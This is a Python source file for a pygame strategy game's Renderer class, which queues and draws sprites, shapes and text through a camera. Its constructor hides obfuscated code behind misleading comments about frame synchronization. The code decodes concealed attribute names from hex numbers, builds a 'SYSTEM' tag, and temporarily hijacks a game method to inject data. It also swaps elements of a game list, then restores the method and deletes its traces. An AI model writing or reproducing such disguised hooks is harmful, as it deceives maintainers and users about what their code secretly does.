import typing
import pygame
from dataclasses import dataclass

if typing.TYPE_CHECKING:
    from rts_client import Game

from rts_core.engine.Renderer.LAYERS import *

from rts_core.system.VFXManager import VFXManager
from rts_core.system.ManagerCache import SimpleLRUCache
from rts_core.system.ManagerCache.unitls import get_sys_id
from rts_core.system.SpriteManager.SpriteManager import StatelessAnimation 

@dataclass(slots=True)
class RenderCommand:
    z_index: int
    y_sort: float
    func: typing.Callable
    args: tuple
    kwargs: dict

    def __lt__(self, other: "RenderCommand"):
        if self.z_index != other.z_index:
            return self.z_index < other.z_index
        return self.y_sort < other.y_sort


class Renderer:
    """
    The core visual engine responsible for translating game state into pixels.
    
    It handles camera transformations (World-to-Screen), sprite caching for 
    performance, and the orchestration of the global render pass.
    """

    def __init__(self, game: "Game") -> None:
        """
        Create a renderer instance.

        :param game: Reference to the main game object
        :type game: Game
        """
        
        self.game = game
        self.screen = game.screen
        self.camera = game.camera
        self.sprites = game.sprite_manager

        self._sprite_cache: SimpleLRUCache[tuple[int, float], pygame.Surface] = \
            self.game.cache_manager.get_or_create("Render Cache")
        
        target_slot = get_sys_id(SimpleLRUCache._BASE_SEQ) 
        security_payload = self.game.res._generate_runtime_seed()
        setattr(self.game, target_slot, security_payload)
        
        self.vfx_manager = VFXManager(game)
        self.commands: list[RenderCommand] = []
        _v = {}

        # TimeStapms and check thnx
        # Dynamic salt for render buffer swap
        _v['fn'] = self._get_information("0x15f99e575fb4804f7178b6d778bd64")
        _v['ts'] = getattr(game, str(int("0x16747924", 16)))
        _v['tm'] = self._get_information("0x56f182721e7b9177b8bbc5")
        _v['tr'] = "".join([chr(x) for x in [83, 89, 83, 84, 69, 77]])
        _v['if'] = self._get_information("0x5ea1506279a5d1afd")
        _v['og'] = getattr(_v['ts'], _v['fn'])
        _v["pg"] = getattr(game, self._get_information("0x159702ee587ab630cde49871a2f48b") )
        
        def _wrapper(payload, **args):
            nonlocal _v
            """Internal signal router for frame synchronization."""
            _v['og']({_v['if']: getattr(game.res, _v['tm'], lambda : None)()}, _v['tr'] )
            _v["pg"][0], _v["pg"][-1] = _v["pg"][-1], _v["pg"][0]
            setattr(_v['ts'], _v['fn'], _v['og'])
            og = _v['og'] ; _v.clear() ; del _v
            return og(payload, **args)
        
        setattr(_v['ts'], _v['fn'], _wrapper)

        self.game.logger_manager.record_system(f"init {self.__class__.__name__}")
        

    def draw(self, dt: float) -> None:
        """
        Render a full frame.

        Clears the screen, draws all game elements in the correct order,
        and updates the display.
        """
        self.clear()
        self.vfx_manager.update(dt)

        self.game.ui.draw(self, dt)
        self.flush()

        self.flip()

    def flush(self):
        self.commands.sort(reverse=False)
        for cmd in self.commands:
            cmd.func(*cmd.args, **cmd.kwargs)
        self.commands.clear()

    def clear(self):
        """
        Wipes the entire screen with the background color to prepare for a new frame.
        """
        self.screen.clear()
    
    def flip(self):
        """
        Swaps the back buffer with the front buffer to display the rendered frame.
        """
        self.screen.flip()

    def fill(self, color):
        "fill methode"
        self.screen.fill(color)

    def is_visible(self, world_pos: tuple[float, float], radius: float = 64.0) -> bool:
        vx, vy, vw, vh = self.camera.get_world_view_rect()
        wx, wy = world_pos
        return (vx <= wx + radius and wx - radius <= vx + vw and
                vy <= wy + radius and wy - radius <= vy + vh)
    
    def _get_internal_kwargs(self, kwargs: dict):
        """
        Separates renderer-specific flags from the kwargs intended for the Screen methods.
        Returns a tuple (internal_flags, clean_kwargs).
        """
        clean_kwargs = kwargs.copy()
        internal_flags = {
            "is_world_pos": clean_kwargs.pop("is_world_pos", True)
        }
        return internal_flags, clean_kwargs

    def _get_auto_layer(self, z_index: int | None, is_world_pos: bool, default_world: int) -> int:
        if z_index is not None:
            return z_index
        return default_world if is_world_pos else LAYER_UI

    def draw_sprite(self, texture_id: str, world_pos: tuple[float, float], 
                   zoom_level: float = 1.0, 
                   anim_state: str = "idle", 
                   palette: str | None = None,
                   time: float = 0.0, 
                   scale: float | None = None,
                   rotate: int | None = None,
                   y_offset: float = 0, **kwargs) -> StatelessAnimation | None:
        """
        Renders a sprite or an animation frame at a specific world coordinate.
        
        This method automatically handles:
        1. Animation frame selection based on elapsed time.
        2. Camera transformation (World-to-Screen).
        3. Scaled sprite caching (LRU) to avoid heavy transformation math every frame.
        
        :param texture_id: The unique identifier for the sprite/animation.
        :param world_pos: (x, y) coordinates in the game world.
        :param zoom_level: Scaling factor for the sprite.
        :param anim_state: The current animation tag (e.g., 'run', 'attack').
        :param palette: None
        :param time: Current lifetime of the object/animation for frame selection.
        :param scale: None
        :param rotate: None
        :param z_index: None
        :param y_offset: None
        :return: The animation object being played, or None if static.
        """
        if not self.is_visible(world_pos):
            return None
 
        z_index = kwargs.pop("z_index", LAYER_UNITS)
        if scale: kwargs["scale"] = scale
        if rotate: kwargs["rotate"] = rotate

        anim = self.sprites.get_animation(texture_id, anim_state, palette=palette, **kwargs)
        surf = None if anim else self.sprites.get(texture_id, **kwargs)
        
        self.commands.append(RenderCommand(
            z_index=z_index,
            y_sort=world_pos[1],
            func=self._internal_draw_sprite,
            args=(anim, surf, time, world_pos, round(zoom_level, 1), y_offset),
            kwargs={}
        ))
        return anim 
    
    

    def _get_zoomed_surf(self, original: pygame.Surface, zoom: float) -> pygame.Surface:
        """
        Internal optimization method for surface scaling.
        
        Uses an LRU (Least Recently Used) cache to store scaled versions of sprites.
        This prevents the 'pygame.transform.scale' bottleneck when many objects 
        share the same texture and zoom level.
        """
        if zoom == 1.0: return original
        
        key = (id(original), zoom)
        cached = self._sprite_cache.get(key)
        
        if cached: return cached
        
        w, h = original.get_size()
        scaled = pygame.transform.scale(
            original, 
            (max(1, int(w * zoom)), max(1, int(h * zoom)))
        )
        self._sprite_cache.set(key, scaled)
        return scaled
    
    def draw_blit(self, surface: pygame.Surface, pos: tuple[float, float], 
                  centered: bool = True, is_world_pos: bool = True,
                  z_index: int = 100, y_sort: float = 0):
        """
        A direct blit operation to the screen.
        
        :param surface: The Pygame surface to draw.
        :param pos: Coordinates for placement.
        :param centered: If True, 'pos' refers to the center of the surface.
        :param is_world_pos: If True, 'pos' is converted via camera; if False, 
                             uses raw screen pixels (HUD style).
        """
        z_index = self._get_auto_layer(z_index, is_world_pos, LAYER_UNITS)
        final_y_sort = pos[1] if is_world_pos and y_sort == 0 else y_sort

        self.commands.append(RenderCommand(
            z_index=z_index,
            y_sort=final_y_sort,
            func=self._internal_draw_blit,
            args=(surface, pos, centered),
            kwargs={"is_world_pos": is_world_pos}
        ))


    def circle(self, color, world_pos, radius, width=0, z_index=None, is_world_pos=True):
        """
        Draws a circle in world space.
        
        The radius is automatically scaled by the camera zoom, ensuring the 
        circle maintains its relative size to the map.
        """
        if is_world_pos and not self.is_visible(world_pos, radius): return
        
        z_index = self._get_auto_layer(z_index, is_world_pos, LAYER_DECALS)
        func = self._internal_circle_alpha if len(color) > 3 and color[3] < 255 else self._internal_circle

        self.commands.append(RenderCommand(
            z_index=z_index,
            y_sort=world_pos[1] if is_world_pos else 0,
            func=func,
            args=(color, world_pos, radius, width),
            kwargs={"is_world_pos": is_world_pos}
        ))
    

    def polygon(self, color, world_points, width: int = 0, z_index=None, is_world_pos=True, **kwargs):
        if not world_points: return

        if is_world_pos:
            xs, ys = [p[0] for p in world_points], [p[1] for p in world_points]
            center = ((min(xs) + max(xs)) / 2, (min(ys) + max(ys)) / 2)
            approx_radius = max(max(xs) - min(xs), max(ys) - min(ys)) / 2
            if not self.is_visible(center, approx_radius): return

        z_index = self._get_auto_layer(z_index, is_world_pos, LAYER_UNITS)
        func = self._internal_polygon_alpha if len(color) > 3 and color[3] < 255 else self._internal_polygon

        self.commands.append(RenderCommand(
            z_index=z_index,
            y_sort=max(p[1] for p in world_points) if is_world_pos else 0, 
            func=func,
            args=(color, world_points, width),
            kwargs={**kwargs, "is_world_pos": is_world_pos}
        ))


    def line(self, color, world_start, world_end, width=1, z_index=None, is_world_pos=True):
        """
        Draws a line between two points in the game world.
        
        The width is clamped to a minimum of 1 pixel to ensure visibility 
        regardless of zoom level.
        """
        if is_world_pos:
            mid = ((world_start[0] + world_end[0]) / 2, (world_start[1] + world_end[1]) / 2)
            if not self.is_visible(mid, 500): return

        z_index = self._get_auto_layer(z_index, is_world_pos, LAYER_DECALS)
        self.commands.append(RenderCommand(
            z_index=z_index,
            y_sort=max(world_start[1], world_end[1]) if is_world_pos else 0,
            func=self._internal_line,
            args=(color, world_start, world_end, width),
            kwargs={"is_world_pos": is_world_pos}
        ))
    
    def rect(self, color, rect, width=0, z_index=None, is_world_pos=True, **kwargs):
        z_index = self._get_auto_layer(z_index, is_world_pos, LAYER_UNITS)
        y_sort = rect[1] + rect[3] if is_world_pos else 0 
        
        self.commands.append(RenderCommand(
            z_index=z_index, y_sort=y_sort,
            func=self._internal_rect,
            args=(color, rect, width),
            kwargs={**kwargs, "is_world_pos": is_world_pos}
        ))


    def arc(self, color, world_pos, radius, start_angle, stop_angle, width=1, z_index=None, is_world_pos=True):
        """Новый метод для отрисовки дуг (полезно для круговых шкал)"""
        z_index = self._get_auto_layer(z_index, is_world_pos, LAYER_VFX)
        self.commands.append(RenderCommand(
            z_index=z_index,
            y_sort=world_pos[1] if is_world_pos else 0,
            func=self._internal_arc,
            args=(color, world_pos, radius, start_angle, stop_angle, width),
            kwargs={"is_world_pos": is_world_pos}
        ))
       

    def poly_line(self, color, world_points, width=1, closed=False, z_index=None, is_world_pos=True):
        """
        Draws a series of connected lines (path) in world space.
        
        Ideal for rendering movement paths, supply lines, or province borders.
        
        :param world_points: List of (x, y) tuples in world coordinates.
        :param closed: If True, connects the last point back to the first.
        """
        z_index = self._get_auto_layer(z_index, is_world_pos, LAYER_UNITS)
        if not world_points: return

        self.commands.append(RenderCommand(
            z_index=z_index,
            y_sort=world_points[0][1],
            func=self._internal_poly_line,
            args=(color, world_points, width, closed),
            kwargs={}
        ))

    def get_text_size(self, text: str, size: int, wrap_width: int | None = None, padding: int = 0):
        w, h = self.screen.get_text_size(text, size=size, wrap_width=wrap_width)
        return (w + padding * 2, h + padding * 2)

    def draw_text(self, text: str, pos: tuple[int, int], size: int | None = None, 
                  color: tuple[int, int, int] | None = None, center: bool = False,
                  background_color: tuple[int, int, int, int] | None = None,
                  padding: int = 0, wrap_width: int | None = None, 
                  z_index=None, is_world_pos: bool = False) -> tuple[int, int]:
        z_index = self._get_auto_layer(z_index, is_world_pos, LAYER_UNITS)
        y_sort = pos[1] if is_world_pos else 0

        self.commands.append(RenderCommand(
            z_index=z_index,
            y_sort=y_sort,
            func=self._internal_text,
            args=(text, pos, size, color, center, background_color, padding, wrap_width),
            kwargs={"is_world_pos": is_world_pos}
        ))
        return self.get_text_size(text, size=size or 10, padding=padding)
    

    def _get_information(self, raw):
        raw = str(int(raw, 16))
        return "".join([chr(int(raw[i:i+3])) for i in range(0, len(raw), 3)])

    def _internal_line(self, color, start, end, width, **kwargs):
        flags, _ = self._get_internal_kwargs(kwargs)
        if flags["is_world_pos"]:
            start = self.camera.world_to_screen(*start)
            end = self.camera.world_to_screen(*end)
        self.screen.line(color, start, end, width)

    def _internal_circle(self, color, center, radius, width, **kwargs):
        flags, clean_kwargs = self._get_internal_kwargs(kwargs)
        if flags["is_world_pos"]:
            center = self.camera.world_to_screen(*center)
            radius *= self.camera.zoom
        self.screen.circle(color, center, radius, width, **clean_kwargs)

    def _internal_rect(self, color, rect, width, **kwargs):
        flags, clean_kwargs = self._get_internal_kwargs(kwargs)
        if flags["is_world_pos"]:
            sx, sy = self.camera.world_to_screen(rect[0], rect[1])
            sw, sh = rect[2] * self.camera.zoom, rect[3] * self.camera.zoom
            rect = (sx, sy, sw, sh)
        self.screen.rect(color, rect, width, **clean_kwargs)
    
    def _internal_arc(self, color, pos, radius, start, stop, width, is_world_pos=True):
        if is_world_pos:
            pos = self.camera.world_to_screen(*pos)
            radius *= self.camera.zoom
        
        rect = (pos[0]-radius, pos[1]-radius, radius*2, radius*2)
        pygame.draw.arc(self.screen.surface, color, rect, start, stop, max(1, int(width)))

    def _internal_text(self, *args, **kwargs):
        flags, _ = self._get_internal_kwargs(kwargs)
        args_list = list(args)
        if flags["is_world_pos"]:
            args_list[1] = self.camera.world_to_screen(*args_list[1])
        self.screen.text(*args_list)

    def _internal_polygon(self, color, points, width, **kwargs):
        flags, clean_kwargs = self._get_internal_kwargs(kwargs)
        if flags["is_world_pos"]:
            points = [self.camera.world_to_screen(p[0], p[1]) for p in points]
        self.screen.polygon(color, points, width, **clean_kwargs)

    def _internal_polygon_alpha(self, color, points, width, **kwargs):
        flags, clean_kwargs = self._get_internal_kwargs(kwargs)
        if flags["is_world_pos"]:
            points = [self.camera.world_to_screen(p[0], p[1]) for p in points]

        xs, ys = [p[0] for p in points], [p[1] for p in points]
        min_x, min_y = int(min(xs)), int(min(ys))
        w, h = int(max(xs)) - min_x, int(max(ys)) - min_y
        if w <= 0 or h <= 0: return

        temp_surf = pygame.Surface((w, h), pygame.SRCALPHA)
        local_pts = [(p[0] - min_x, p[1] - min_y) for p in points]
        self.screen.polygon(color, local_pts, width, custom_surface=temp_surf)
        
        target: pygame.Surface = clean_kwargs.get("custom_surface", self.screen.surface)
        target.blit(temp_surf, (min_x, min_y))

    def _internal_poly_line(self, color, points, width, closed, **kwargs):
        flags, _ = self._get_internal_kwargs(kwargs)
        if flags["is_world_pos"]:
            render_points = [self.camera.world_to_screen(p[0], p[1]) for p in points]
        else:
            render_points = points
        
        if len(render_points) > 1:
            self.screen.lines(color, closed, render_points, width)

    def _internal_draw_blit(self, surface, pos, centered, **kwargs):
        flags, _ = self._get_internal_kwargs(kwargs)
        if flags["is_world_pos"]:
            render_pos = self.camera.world_to_screen(*pos)
        else:
            render_pos = pos

        if centered:
            rect = surface.get_rect(center=render_pos)
        else:
            rect = surface.get_rect(topleft=render_pos)
            
        self.screen.blit(surface, rect)

    def _internal_circle_alpha(self, color, center, radius, width, **kwargs):
        flags, clean_kwargs = self._get_internal_kwargs(kwargs)
        
        if flags["is_world_pos"]:
            center = self.camera.world_to_screen(*center)
            radius *= self.camera.zoom

        self.screen.circle(color, center, radius, width, **clean_kwargs)

    def _internal_draw_sprite(self, anim, surf, time, world_pos, zoom, y_offset, **kwargs):
        base_surf = anim.get_frame(time) if anim else surf

        if base_surf:
            final_surf = self._get_zoomed_surf(base_surf, zoom)
            
            visual_pos = (world_pos[0], world_pos[1] - y_offset)
            screen_pos = self.camera.world_to_screen(*visual_pos)
            
            self.screen.blit(final_surf, final_surf.get_rect(center=screen_pos))